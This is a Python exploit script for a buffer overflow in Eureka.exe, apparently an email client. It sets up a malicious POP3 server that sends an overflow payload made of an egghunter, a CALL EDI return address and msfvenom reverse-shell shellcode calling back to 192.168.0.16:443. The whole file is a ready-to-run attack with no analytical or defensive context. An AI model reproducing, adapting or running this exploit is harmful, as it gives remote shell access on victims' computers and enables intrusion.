import struct, socket

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16
# LPORT=443 -f c --smallest -e x86/alpha_upper -b "\x00"
# EXITFUNC=thread
shellcode = (
"w00tw00t"
"\x89\xe3\xd9\xc1\xd9\x73\xf4\x5b\x53\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4c\x42\x35\x50"
"\x55\x50\x53\x30\x35\x30\x4c\x49\x4a\x45\x36\x51\x39\x50\x55"
"\x34\x4c\x4b\x36\x30\x56\x50\x4c\x4b\x50\x52\x34\x4c\x4c\x4b"
"\x51\x42\x32\x34\x4c\x4b\x54\x32\x31\x38\x34\x4f\x48\x37\x31"
"\x5a\x47\x56\x46\x51\x4b\x4f\x4e\x4c\x37\x4c\x45\x31\x53\x4c"
"\x54\x42\x46\x4c\x51\x30\x4f\x31\x58\x4f\x44\x4d\x55\x51\x59"
"\x57\x4a\x42\x4a\x52\x30\x52\x30\x57\x4c\x4b\x50\x52\x34\x50"
"\x4c\x4b\x31\x5a\x37\x4c\x4c\x4b\x50\x4c\x42\x31\x44\x38\x4a"
"\x43\x57\x38\x55\x51\x48\x51\x50\x51\x4c\x4b\x46\x39\x57\x50"
"\x43\x31\x48\x53\x4c\x4b\x51\x59\x45\x48\x5a\x43\x56\x5a\x31"
"\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x59\x46\x46\x51\x4b\x4f"
"\x4e\x4c\x4f\x31\x58\x4f\x44\x4d\x53\x31\x4f\x37\x50\x38\x4b"
"\x50\x54\x35\x4a\x56\x44\x43\x43\x4d\x5a\x58\x47\x4b\x33\x4d"
"\x51\x34\x32\x55\x4a\x44\x51\x48\x4c\x4b\x46\x38\x36\x44\x43"
"\x31\x58\x53\x35\x36\x4c\x4b\x34\x4c\x50\x4b\x4c\x4b\x36\x38"
"\x55\x4c\x53\x31\x49\x43\x4c\x4b\x34\x44\x4c\x4b\x33\x31\x4e"
"\x30\x4b\x39\x50\x44\x57\x54\x31\x34\x51\x4b\x51\x4b\x45\x31"
"\x50\x59\x30\x5a\x30\x51\x4b\x4f\x4b\x50\x31\x4f\x51\x4f\x50"
"\x5a\x4c\x4b\x34\x52\x5a\x4b\x4c\x4d\x51\x4d\x45\x38\x30\x33"
"\x46\x52\x45\x50\x45\x50\x32\x48\x53\x47\x33\x43\x57\x42\x31"
"\x4f\x50\x54\x33\x58\x50\x4c\x43\x47\x31\x36\x53\x37\x4b\x4f"
"\x59\x45\x58\x38\x4a\x30\x55\x51\x43\x30\x55\x50\x46\x49\x39"
"\x54\x50\x54\x56\x30\x53\x58\x37\x59\x4b\x30\x42\x4b\x45\x50"
"\x4b\x4f\x38\x55\x56\x30\x50\x50\x56\x30\x36\x30\x47\x30\x56"
"\x30\x37\x30\x36\x30\x45\x38\x4a\x4a\x34\x4f\x39\x4f\x4b\x50"
"\x4b\x4f\x58\x55\x4d\x47\x32\x4a\x44\x45\x35\x38\x39\x50\x4e"
"\x48\x43\x30\x32\x30\x52\x48\x34\x42\x35\x50\x45\x51\x4f\x4b"
"\x4c\x49\x4b\x56\x42\x4a\x32\x30\x50\x56\x51\x47\x33\x58\x4d"
"\x49\x4e\x45\x52\x54\x35\x31\x4b\x4f\x59\x45\x4d\x55\x4f\x30"
"\x44\x34\x44\x4c\x4b\x4f\x50\x4e\x35\x58\x33\x45\x5a\x4c\x32"
"\x48\x4c\x30\x58\x35\x4e\x42\x36\x36\x4b\x4f\x39\x45\x42\x48"
"\x33\x53\x42\x4d\x32\x44\x33\x30\x4d\x59\x5a\x43\x31\x47\x50"
"\x57\x31\x47\x56\x51\x4b\x46\x53\x5a\x44\x52\x51\x49\x31\x46"
"\x4d\x32\x4b\x4d\x33\x56\x59\x57\x50\x44\x36\x44\x57\x4c\x53"
"\x31\x35\x51\x4c\x4d\x37\x34\x37\x54\x34\x50\x48\x46\x45\x50"
"\x31\x54\x30\x54\x56\x30\x46\x36\x50\x56\x46\x36\x57\x36\x36"
"\x36\x30\x4e\x51\x46\x51\x46\x31\x43\x50\x56\x52\x48\x53\x49"
"\x38\x4c\x47\x4f\x4b\x36\x4b\x4f\x39\x45\x4b\x39\x4b\x50\x50"
"\x4e\x50\x56\x31\x56\x4b\x4f\x30\x30\x32\x48\x43\x38\x4b\x37"
"\x35\x4d\x33\x50\x4b\x4f\x48\x55\x4f\x4b\x4b\x50\x55\x4d\x57"
"\x5a\x55\x5a\x33\x58\x59\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f"
"\x48\x55\x37\x4c\x35\x56\x33\x4c\x45\x5a\x4d\x50\x4b\x4b\x4d"
"\x30\x43\x45\x54\x45\x4f\x4b\x51\x57\x34\x53\x53\x42\x32\x4f"
"\x32\x4a\x55\x50\x31\x43\x4b\x4f\x49\x45\x41\x41"
)

lhost   = "192.168.0.16" # this is to calculate the offset
junk	= "\x90" * 153 	 # offset to start of egghunter

# ./egghunter.rb -f c -a x86 -p windows -e w00t
egghunter =  (
"\x89\xe0\xda\xc9\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43\x43"
"\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41"
"\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
"\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
"\x38\x41\x43\x4a\x4a\x49\x32\x46\x4d\x51\x49\x5a\x4b\x4f\x44"
"\x4f\x50\x42\x30\x52\x42\x4a\x44\x42\x36\x38\x58\x4d\x36\x4e"
"\x57\x4c\x43\x35\x51\x4a\x33\x44\x4a\x4f\x48\x38\x43\x47\x56"
"\x50\x30\x30\x52\x54\x4d\x59\x39\x47\x4e\x4f\x32\x55\x4a\x4a"
"\x4e\x4f\x43\x45\x4a\x47\x4b\x4f\x4d\x37\x41\x41"
)
# offset to RET aka (where EIP is overwritten)
junk2	= "A" * (723 - (
	len(lhost) +
	len(junk) +
	len(egghunter)
	)
)
# CALL EDI (Eureka.exe)
ret	= struct.pack('<L', 0x00403e99)

payload = junk + egghunter + junk2 + ret + shellcode


try:
	print "[*] listening on %s:110 waiting for victim" % (lhost)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("192.168.0.16", 110))
	sock.listen(1)

	client, addr = sock.accept()

	print "[!] incoming connection on %s:%d" % (addr[0], addr[1])

	while 1:
		client.send("-ERR " + payload)
	client.close()
except:
	print "[-] exploitation complete"
